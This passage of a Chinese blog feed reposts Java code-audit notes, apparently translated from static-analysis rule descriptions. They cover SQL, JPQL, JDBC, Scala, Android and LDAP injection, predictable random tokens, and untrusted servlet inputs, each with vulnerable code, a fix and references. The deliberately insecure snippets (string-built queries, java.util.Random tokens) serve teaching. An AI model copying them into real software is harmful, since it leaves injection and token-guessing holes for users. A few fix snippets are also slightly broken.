rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的sql-JDOQL注入-JDO"><a href="#潜在的sql-JDOQL注入-JDO" class="headerlink" title="潜在的sql/JDOQL注入(JDO)"></a>潜在的sql/JDOQL注入(JDO)</h1><p>漏洞特征：SQL_INJECTION_JDO<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PersistenceManager pm = getPM();</span><br><span class="line"></span><br><span class="line">Query q = pm.newQuery(&quot;select * from Users where name = &quot; + input);</span><br><span class="line">q.execute();</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PersistenceManager pm = getPM();</span><br><span class="line"></span><br><span class="line">Query q = pm.newQuery(&quot;select * from Users where name = nameParam&quot;);</span><br><span class="line">q.declareParameters(&quot;String nameParam&quot;);</span><br><span class="line">q.execute(input);</span><br></pre></td></tr></table></figure><p>引用(JDO)：<br><a href="https://db.apache.org/jdo/object_retrieval.html" target="_blank" rel="noopener">JDO: Object Retrieval</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的sql-JPQL注入-JPA"><a href="#潜在的sql-JPQL注入-JPA" class="headerlink" title="潜在的sql/JPQL注入(JPA)"></a>潜在的sql/JPQL注入(JPA)</h1><p>漏洞特征： SQL_INJECTION_JPA<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EntityManager pm = getEM();</span><br><span class="line"></span><br><span class="line">TypedQuery&lt;UserEntity&gt; q = em.createQuery(</span><br><span class="line">    String.format(&quot;select * from Users where name = %s&quot;, username),</span><br><span class="line">    UserEntity.class);</span><br><span class="line"></span><br><span class="line">UserEntity res = q.getSingleResult();</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TypedQuery&lt;UserEntity&gt; q = em.createQuery(</span><br><span class="line">    &quot;select * from Users where name = usernameParam&quot;,UserEntity.class)</span><br><span class="line">    .setParameter(&quot;usernameParam&quot;, username);</span><br><span class="line"></span><br><span class="line">UserEntity res = q.getSingleResult();</span><br></pre></td></tr></table></figure><p>引用 (JPA)<br><a href="http://docs.oracle.com/javaee/6/tutorial/doc/bnbrg.html" target="_blank" rel="noopener">The Java EE 6 Tutorial: Creating Queries Using the Java Persistence Query Language</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的JDBC注入-Spring-JDBC"><a href="#潜在的JDBC注入-Spring-JDBC" class="headerlink" title="潜在的JDBC注入(Spring JDBC)"></a>潜在的JDBC注入(Spring JDBC)</h1><p>漏洞特征：SQL_INJECTION_SPRING_JDBC<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。或者，每一个参数应该被正确的转义。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JdbcTemplate jdbc = new JdbcTemplate();</span><br><span class="line">int count = jdbc.queryForObject(&quot;select count(*) from Users where name = &apos;&quot;+paramName+&quot;&apos;&quot;, Integer.class);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JdbcTemplate jdbc = new JdbcTemplate();</span><br><span class="line">int count = jdbc.queryForObject(&quot;select count(*) from Users where name = ?&quot;, Integer.class, paramName);</span><br></pre></td></tr></table></figure><p>引用 (Spring JDBC)<br><a href="http://docs.spring.io/spring-framework/docs/current/spring-framework-reference/html/jdbc.html" target="_blank" rel="noopener">Spring Official Documentation: Data access with JDBC</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的JDBC注入"><a href="#潜在的JDBC注入" class="headerlink" title="潜在的JDBC注入"></a>潜在的JDBC注入</h1><p>漏洞特征：SQL_INJECTION_JDBC<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Connection conn = [...];</span><br><span class="line">Statement stmt = con.createStatement();</span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;update COFFEES set SALES = &quot;+nbSales+&quot; where COF_NAME = &apos;&quot;+coffeeName+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Connection conn = [...];</span><br><span class="line">conn.prepareStatement(&quot;update COFFEES set SALES = ? where COF_NAME = ?&quot;);</span><br><span class="line">updateSales.setInt(1, nbSales);</span><br><span class="line">updateSales.setString(2, coffeeName);</span><br></pre></td></tr></table></figure><p>引用 (JDBC)<br><a href="http://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html" target="_blank" rel="noopener">Oracle Documentation: The Java Tutorials &gt; Prepared Statements</a><br>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的Scala-Slick注入"><a href="#潜在的Scala-Slick注入" class="headerlink" title="潜在的Scala Slick注入"></a>潜在的Scala Slick注入</h1><p>漏洞特征：SCALA_SQL_INJECTION_SLICK<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.run &#123;</span><br><span class="line">  sql&quot;select * from people where name = &apos;#$value&apos;&quot;.as[Person]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.run &#123;</span><br><span class="line">  sql&quot;select * from people where name = $value&quot;.as[Person]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的Scala-Anorm注入"><a href="#潜在的Scala-Anorm注入" class="headerlink" title="潜在的Scala Anorm注入"></a>潜在的Scala Anorm注入</h1><p>漏洞特征：SCALA_SQL_INJECTION_ANORM<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val peopleParser = Macro.parser[Person](&quot;id&quot;, &quot;name&quot;, &quot;age&quot;)</span><br><span class="line"></span><br><span class="line">DB.withConnection &#123; implicit c =&gt;</span><br><span class="line">  val people: List[Person] = SQL(&quot;select * from people where name = &apos;&quot; + value + &quot;&apos;&quot;).as(peopleParser.*)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val peopleParser = Macro.parser[Person](&quot;id&quot;, &quot;name&quot;, &quot;age&quot;)</span><br><span class="line"></span><br><span class="line">DB.withConnection &#123; implicit c =&gt;</span><br><span class="line">  val people: List[Person] = SQL&quot;select * from people where name = $value&quot;.as(peopleParser.*)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的安卓sql注入"><a href="#潜在的安卓sql注入" class="headerlink" title="潜在的安卓sql注入"></a>潜在的安卓sql注入</h1><p>漏洞特征：SQL_INJECTION_ANDROID<br>输入进sql查询的数据应该通过严格的检查。在预编译中绑定参数可以更容易的缓解sql注入带来的危害。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM  messages WHERE uid= &apos;&quot;+userInput+&quot;&apos;&quot; ;</span><br><span class="line">Cursor cursor = this.getReadableDatabase().rawQuery(query,null);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM  messages WHERE uid= ?&quot; ;</span><br><span class="line">Cursor cursor = this.getReadableDatabase().rawQuery(query,new String[] &#123;userInput&#125;);</span><br></pre></td></tr></table></figure><p>引用 (Android SQLite)<br><a href="http://www.informit.com/articles/article.aspx?p=2268753&seqNum=5" target="_blank" rel="noopener">InformIT.com: Practical Advice for Building Secure Android Databases in SQLite</a><br><a href="https://www.packtpub.com/books/content/knowing-sql-injection-attacks-and-securing-our-android-applications-them" target="_blank" rel="noopener">Packtpub.com: Knowing the SQL-injection attacks and securing our Android applications from them</a></p><p><a href="https://books.google.ca/books?id=SXlMAQAAQBAJ&lpg=PR1&pg=PA64#v=onepage&q&f=false" target="_blank" rel="noopener">Android Database Support (Enterprise Android: Programming Android Database Applications for the Enterprise)</a></p><p><a href="https://stackoverflow.com/a/29797229/89769" target="_blank" rel="noopener">Safe example of Insert, Select, Update and Delete queryies provided by Suragch</a></p><p>引用（sql注入）<br>[WASC-19: SQL Injection](<a href="http://projects.webappsec.org/w/page/13246963/SQL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246963/SQL</a> Injection)<br><a href="http://capec.mitre.org/data/definitions/66.html" target="_blank" rel="noopener">CAPEC-66: SQL Injection</a><br><a href="http://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: SQL Injection Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Query Parameterization Cheat Sheet</a></p><h1 id="潜在的LDAP注入"><a href="#潜在的LDAP注入" class="headerlink" title="潜在的LDAP注入"></a>潜在的LDAP注入</h1><p>漏洞特征：LDAP_INJECTION<br>就像sql，所有进入到ldap查询的语句都必须要保证安全。不幸的是，ldap没有像sql那样的预编译接口。所以，现在的主要防御方式是，在参数进入ladp查询之前对其进行严格的检验。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NamingEnumeration&lt;SearchResult&gt; answers = context.search(&quot;dc=People,dc=example,dc=com&quot;,</span><br><span class="line">        &quot;(uid=&quot; + username + &quot;)&quot;, ctrls);</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-29: LDAP Injection](<a href="http://projects.webappsec.org/w/page/13246947/LDAP" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246947/LDAP</a> Injection)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/90.html" target="_blank" rel="noopener">CWE-90: Improper Neutralization of Special Elements used in an LDAP Query (‘LDAP Injection’)</a><br><a href="http://www.veracode.com/security/ldap-injection" target="_blank" rel="noopener">LDAP Injection Guide: Learn How to Detect LDAP Injections and Improve LDAP Security</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY2&quot;&gt;&lt;a href=&quot;#Java审计-DAY2&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY2&quot;&gt;&lt;/a&gt;Java审计-DAY2&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.n
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY1</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY1/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY1/</id>
    <published>2020-03-02T06:56:43.000Z</published>
    <updated>2020-03-03T03:35:33.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY1"><a href="#Java审计-DAY1" class="headerlink" title="Java审计-DAY1"></a>Java审计-DAY1</h1><p>本文转载自 <a href="https://blog.csdn.net/niexinming/article/details/84264261" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84264261</a> </p><h1 id="可预测的伪随机数发生器"><a href="#可预测的伪随机数发生器" class="headerlink" title="可预测的伪随机数发生器"></a>可预测的伪随机数发生器</h1><p>漏洞特征：<code>PREDICTABLE_RANDOM</code><br>在某些关键的安全环境中使用可预测的随机数可能会导致漏洞，比如，当这个值被作为：</p><ul><li>csrf token；如果攻击者可以预测csrf的token值的话，就可以发动csrf攻击</li><li>重置密码的token（通过邮件发送）；如果重置密码的token被替换的话，那么就会导致用户账户被接管，因为攻击者会猜测到重置密码的链接。</li><li>其他包含秘密的信息</li></ul><p>修复这个漏洞最快的方式是用强随机数生成器（ 比如：<code>java.security.SecureRandom</code>）替换掉<br><code>java.util.Random</code></p><p>有漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Random r = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">return</span> Long.toHexString(r.nextLong());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Hex;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecureRandom secRandom = <span class="keyword">new</span> SecureRandom();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">32</span>];</span><br><span class="line">    secRandom.nextBytes(result);</span><br><span class="line">    <span class="keyword">return</span> Hex.encodeHexString(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure><p>引用：</p><p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html" target="_blank" rel="noopener">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br><a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers" target="_blank" rel="noopener">CERT: MSC02-J. Generate strong random numbers</a><br><a href="http://cwe.mitre.org/data/definitions/330.html" target="_blank" rel="noopener">CWE-330: Use of Insufficiently Random Values</a><br><a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html" target="_blank" rel="noopener">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a></p><h1 id="可预测的伪随机数发生器（Scala）"><a href="#可预测的伪随机数发生器（Scala）" class="headerlink" title="可预测的伪随机数发生器（Scala）"></a>可预测的伪随机数发生器（Scala）</h1><p>漏洞特征：<code>PREDICTABLE_RANDOM_SCALA</code><br>在某些关键的安全环境中使用可预测的随机数可能会导致漏洞，比如，当这个值被作为：</p><ul><li>csrf token；如果攻击者可以预测csrf的token值的话，就可以发动csrf攻击</li><li>重置密码的token（通过邮件发送）；如果重置密码的token被替换的话，那么就会导致用户账户被接管，因为攻击者会猜测到重置密码的链接。</li><li>其他包含秘密的信息</li></ul><p>修复这个漏洞最快的方式是用强随机数生成器（ 比如：<code>java.security.SecureRandom</code>）替换掉<br><code>java.util.Random</code><br>有漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.util.Random</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    val result = Seq.fill(<span class="number">16</span>)(Random.nextInt)</span><br><span class="line">    <span class="keyword">return</span> result.map(<span class="string">"%02x"</span> format _).mkString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.SecureRandom</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    val rand = <span class="keyword">new</span> SecureRandom()</span><br><span class="line">    val value = Array.ofDim[Byte](<span class="number">16</span>)</span><br><span class="line">    rand.nextBytes(value)</span><br><span class="line">    <span class="keyword">return</span> value.map(<span class="string">"%02x"</span> format _).mkString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html" target="_blank" rel="noopener">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br><a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers" target="_blank" rel="noopener">CERT: MSC02-J. Generate strong random numbers</a><br><a href="http://cwe.mitre.org/data/definitions/330.html" target="_blank" rel="noopener">CWE-330: Use of Insufficiently Random Values</a><br><a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html" target="_blank" rel="noopener">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a></p><h1 id="没有做任何安全检查的servlet-参数"><a href="#没有做任何安全检查的servlet-参数" class="headerlink" title="没有做任何安全检查的servlet 参数"></a>没有做任何安全检查的servlet 参数</h1><p>漏洞特征：<code>SERVLET_PARAMETER</code><br>Servlet 会从各种函数中获取到GET和POST的值。这些被获取的值肯定是不安全的。在进入到敏感的api函数之前你可能需要验证和过滤这些值：</p><ul><li>sql 查询 （可能导致sql注入）</li><li>文件操作 （ 可能会导致目录穿越 ）</li><li>命令执行 （ 可能会导致命令注入 ）</li><li>html解析 （可能会导致xss)</li><li>其他的</li></ul><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查Content-Type-头"><a href="#没有做任何安全检查Content-Type-头" class="headerlink" title="没有做任何安全检查Content-Type 头"></a>没有做任何安全检查Content-Type 头</h1><p>漏洞特征：SERVLET_CONTENT_TYPE<br>服务器端程序通过客户端收集http的Content-Type的值。这个值可能会影响影响应用的安全性</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查Hostname-头"><a href="#没有做任何安全检查Hostname-头" class="headerlink" title="没有做任何安全检查Hostname 头"></a>没有做任何安全检查Hostname 头</h1><p>漏洞特征： SERVLET_SERVER_NAME<br>服务器端程序通过客户端收集http的hostname 的值。这个值可能会影响影响应用的安全性。<code>ServletRequest.getServerName()</code>和 <code>HttpServletRequest.getHeader(&quot;Host&quot;)</code>的行为很相似，都是从http头部中获取到host的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /testpage HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">[...]</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>默认情况下，web容器可能会直接将请求重定向到你的应用程序中。这就允许用户把恶意的请求放入http的host头中。我建议你不要信任来自客户端的任何输入。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的session-cookie值"><a href="#没有做任何安全检查的session-cookie值" class="headerlink" title="没有做任何安全检查的session cookie值"></a>没有做任何安全检查的session cookie值</h1><p>漏洞特征： SERVLET_SESSION_ID<br><code>HttpServletRequest.getRequestedSessionId()</code>( <a href="http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getRequestedSessionId()" target="_blank" rel="noopener">http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getRequestedSessionId()</a> )函数返回cookie中JSESSIONID的值。这个值通常被session 管理器访问，而不是开发者代码。<br>传递给客户端的值通常是字母数字（ 例如：JSESSIONID=jp6q31lq2myn ），无论如何，这个值可以被客户端改变，下面的http请求展示了潜在的危险</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /somePage HTTP/1.1</span><br><span class="line">Host: yourwebsite.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Cookie: JSESSIONID=Any value of the user&apos;s choice!!??&apos;&apos;&apos;&quot;&gt;</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>像这样，JSESSIONID应该仅被使用判断是否与存在的session ID相匹配，如果不存在对应的session ID，那么这个用户就可能会是未授权用户。此外， session ID的值应该从来不被记录，如果记录了，那么日志文件中就会包含有效的且在激活状态的session IDs，这样就会允许内部员工可以通过日志记录来劫持任意在线用户。</p><p>引用：</p><p><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Session Management Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查的查询字符串"><a href="#没有做任何安全检查的查询字符串" class="headerlink" title="没有做任何安全检查的查询字符串"></a>没有做任何安全检查的查询字符串</h1><p>漏洞特征： SERVLET_QUERY_STRING<br>查询字符串是get请求中参数名和参数值的串联，可以传入预期之外的参数。 比如URL请求：/app/servlet.htm?a=1&amp;b=2 ，查询字符串就是a=1&amp;b=2<br>通过函数 HttpServletRequest.getParameter() 接收每一个传递进来的参数的值，通过 HttpServletRequest.getQueryString() 这个函数获取到的值应该被看做不安全的。你应该在查询字符串进入敏感函数之前去充分的效验和过滤它们。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查的HTTP头"><a href="#没有做任何安全检查的HTTP头" 